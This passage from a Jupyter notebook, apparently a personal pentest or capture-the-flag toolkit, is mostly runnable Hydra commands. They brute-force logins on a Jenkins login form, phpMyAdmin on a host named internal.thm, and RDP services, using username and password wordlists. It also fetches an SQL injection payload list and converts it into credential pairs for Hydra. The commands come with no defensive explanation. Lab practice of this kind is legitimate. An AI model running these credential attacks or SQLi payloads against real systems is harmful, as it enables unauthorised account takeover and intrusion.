  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a41e375-f575-4dc6-ab8b-4c220b4d3401",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env DIR=/j_acegi_security_check\n",
    "%env BODY=j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in\n",
    "# %env COOKIE=H=Cookie: JSESSIONID.eac25c2d=node0f05wmgvaznppx0gmi6ii0cy42.node0\n",
    "%env COND=Invalid username or"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bba369bf-c0fa-48b0-9d26-159ab4dfe7dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l admin -s $PORT -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c567108e-1daa-461b-97f2-1c621612bc77",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -s $PORT -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5ae0b29-b318-424e-9992-ac85af10d6d3",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -s $PORT -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9931bd17-c6c3-4a4e-ae23-a68d45af1ce4",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -t 64 -I -L my_usernames.txt -s $PORT -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0dfd2bbf-6b4a-4366-835b-375e7242c32c",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Admin:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26fdb2c4-afed-4a9b-a40d-633d45746a45",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env TARGET=internal.thm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "814dd342-b8d5-4c60-bc44-53a8414443da",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env DIR=/phpmyadmin/index.php\n",
    "%env BODY=pma_username=^USER^&pma_password=^PASS^\n",
    "%env COND=Access denied|AllowNoPassword|Language"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e643f14-3597-4efd-8f8e-c3dafe93b0ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe0378ad-18c0-469c-9d91-1cd9a0a15eee",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l root -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3126d96-6039-477c-a767-918313d3ca6b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l admin -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "942055bc-7de3-440d-84c8-69837a9bc399",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l root -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28718d33-90e5-4455-9b9f-e1e750d7fe6e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a29c4c4-81cb-444f-8c8d-bf2e756586ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90a888eb-a6f9-407e-95a9-6ebd46a36362",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9bd7f46c-5eb6-4388-a3ae-0eb44f695722",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36cbc35a-3e19-41c0-8b29-03b02d2023f2",
   "metadata": {
    "tags": []
   },
   "source": [
    "## HTTP Post SQLi:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b18e78b-f369-413b-95b1-cf6078c7141b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!wget https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/xPlatform/xplatform.txt\n",
    "%env SQLWL=xplatform.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72b1c142-ff27-48da-8c79-96aadf5dd1d1",
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "!cat xplatform.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f55e8f32-a7b2-46e2-92a5-1011d4b0b912",
   "metadata": {},
   "outputs": [],
   "source": [
    "lines = []\n",
    "with open('xplatform.txt', 'r') as f:\n",
    "    for line in f.readlines():\n",
    "        passwd=line.strip()\n",
    "        to_add = passwd+\":\"+passwd\n",
    "        if '031003000270000' in to_add:\n",
    "            continue\n",
    "        lines.append(to_add)\n",
    "        \n",
    "with open('pairs.txt', 'w') as f:\n",
    "    f.write(\"\\n\".join(lines))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34c29af0-c7fd-4f9d-bc7e-e4a23ce6076b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo $TARGET$DIR:$BODY:$COND"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1fcf7f0-e003-483d-bf3c-aaecc1bfbbe2",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -vv -I -C pairs.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04b8a04a-3c0f-489e-9d62-0957a2b311fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -V -f -L $USERLIST -P $WORDLIST rdp://$TARGET"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95b92508-8266-4198-bab5-d2744c11001f",
   "metadata": {
    "tags": []
   },
   "source": [
    "# RDP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "973d624a-a66c-4650-8529-767ddba95199",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -V -f -l $UL_S -P $PL rdp://$TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd7ec17e-042d-45f4-8737-b8a5a17f03f1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -V -f -l $UL_S -P $PLRY rdp://$TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1cbd2e6-f27c-4468-a77c-6fd4b50e3c4e",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo hydra -I -l administrator -P $PL rdp://$TARGET/RELEVANT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "765688ba-d609-4030-9da4-14f58575ae70",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET rdp"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
